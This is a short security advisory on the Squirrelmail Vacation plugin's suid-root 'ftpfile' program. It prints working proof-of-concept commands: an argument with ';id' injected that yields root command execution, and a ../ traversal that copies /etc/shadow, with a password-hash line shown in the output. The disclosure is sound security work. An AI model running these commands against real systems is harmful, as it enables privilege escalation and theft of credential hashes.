===[ Overview 

Vacation plugin for Squirrelmail allows UNIX users to set an auto-reply
message to incoming email. That is commonly used to notify the sender of 
the receiver's absence. Vacation plugin specifically uses the Vacation program.
Plugin can be downloaded from:
http://www.squirrelmail.org/plugins/vacation0.15-1.43a.tar.gz



===[ Vulnerability

Within Squirrelmail Vacation plugin there is suid root program 'ftpfile'.
The program is used to access local files in user's home directory. There is
a privilege escalation and arbitrary file read vulnerability in ftpfile. 
Command line arguments are passed to execve() function without checking
for meta-characters, therefore making possible execution of commands as root.

[ljuranic@...top ljuranic]$ id
uid=509(ljuranic) gid=513(ljuranic) groups=513(ljuranic)
[ljuranic@...top ljuranic]$  ftpfile 0 root 0 get 0 "LSS-Security;id"
/bin/cp: omitting directory `/root/0'
uid=0(root) gid=513(ljuranic) groups=513(ljuranic)
[ljuranic@...top ljuranic]$ 

It is also possible to read restricted files (such as /etc/shadow), since
ftpfile can copy a file from user's home directory to any other
directory without checking file name for directory traversal attack.

$ ftpfile localhost root root get ../../../../etc/shadow ./shadow
./shadow[ljuranic@...top ljuranic]$ head ./shadow
root:$1$Pwqt1daJ$DIe.fhBadNTN6d1br1OGy0:12401:0:99999:7:::

[ljuranic@...top ljuranic]$
